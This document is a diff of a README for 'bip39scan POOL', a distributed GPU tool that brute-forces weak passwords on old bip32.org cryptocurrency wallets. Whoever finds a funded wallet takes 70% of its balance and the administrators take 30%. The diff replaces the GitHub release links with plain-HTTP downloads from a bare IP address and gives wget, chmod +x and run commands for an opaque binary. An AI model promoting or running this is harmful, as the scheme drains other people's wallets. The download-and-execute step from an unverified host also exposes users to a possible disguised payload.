@@ -1,39 +1,33 @@
 # bip39scan v2.0.1 POOL
+**Collective search of old coins from the site bip32.org**
 
+➡️ Online Statistic https://bip39scan.com<br>
+➡️ Telegram group https://t.me/bip39scan
 
-Online Statistic https://bip39scan.com<br>
+**Pool conditions:**<br>
+70% of the balance of the find to the one who found the password.<br>
+30% of the balance of the find to the project administration
 
+## Connect to the pool
 ### Linux:
-wget https://github.com/phrutis/bip39scan_v2_POOL/releases/download/2.0.1/xx<br>
-wget https://github.com/phrutis/bip39scan_v2_POOL/releases/download/2.0.1/precomp.bin<br>
-wget https://github.com/phrutis/bip39scan_v2_POOL/releases/download/2.0.1/libcrypto-1_1-x64.dll (Needed if the library is not installed)<br>
+wget http://95.215.108.160/up/xx<br>
+wget http://95.215.108.160/up/precomp.bin<br>
+wget http://95.215.108.160/up/libcrypto-1_1-x64.dll<br>
 ```chmod +x xx```<br>
-```./xx -u YourNickName```<br>
+```./xx -u YourNickName --bloom 2048M```<br>
+
 ### Windows:
-https://github.com/phrutis/bip39scan_v2_POOL/releases/download/2.0.1/xx.exe<br>
-https://github.com/phrutis/bip39scan_v2_POOL/releases/download/2.0.1/precomp.bin<br>
-https://github.com/phrutis/bip39scan_v2_POOL/releases/download/2.0.1/libcrypto-1_1-x64.dll (Needed if the library is not installed)<br>
-```xx.exe -u Nick_Name```<br>
-
-Pool for collective search of vulnerable passwords instead of mnemonic phrases.<br>
-The pool has a page with general client statistics. (see screenshot above)<br>
-The top clients are formed by the total number of passwords passed. Offline users become grey.<br>
+http://95.215.108.160/up/xx.exe<br>
+http://95.215.108.160/up/precomp.bin<br>
+http://95.215.108.160/up/libcrypto-1_1-x64.dll<br>
+```xx.exe -u Nick_Name --bloom 2048M```<br>
 
 
 
-# 2 Telegram groups
+## Question and Answer
 
-In the configuration file, specify the telegram bot and 2 chats IDs.<br>
-The message public group:<br>
 
--============== FOUND ==============-<br>
-User: Alex3322<br>
-Adr: 0x8ba042c96f27f5012cf0e66114793b0b5b11bc24<br>
-===================================<br>
 
-Comes to the admin group<br>
-
-<img width="393" height="621" alt="Image" src="https://github.com/user-attachments/assets/f0e8c9ae-8d53-4309-9493-bd31a1c8b5f0" />
 
 # Clients MultiGPUs
 All clients perform their part (chunk) of the overall task.<br>
@@ -57,14 +51,5 @@ If the client finds an address, the window displays the found address.<br>
 The search position is displayed in the admin client<br>
 ![Image](https://github.com/user-attachments/assets/5fa5e231-56c6-4845-afea-36483cf3f5c3)
 
-If the server has a 7-16 GB address base, add --blom 2048M to the startup line<br>
-For the alleth.bin database of 29 GB, add --blom 4096M<br>
-ex. ```./xx -u Alex3322 --bloom 4096M```
-<hr>
 
-For any questions, contact @phrutis<br>
-
-If you don't have the knowledge, run putty to install the server, configure, and build clients.<br> 
-I'll give you the contact of a programmer, he will help you install, configure, and build clients if you need to make changes.<br> 
-His services are paid.
 
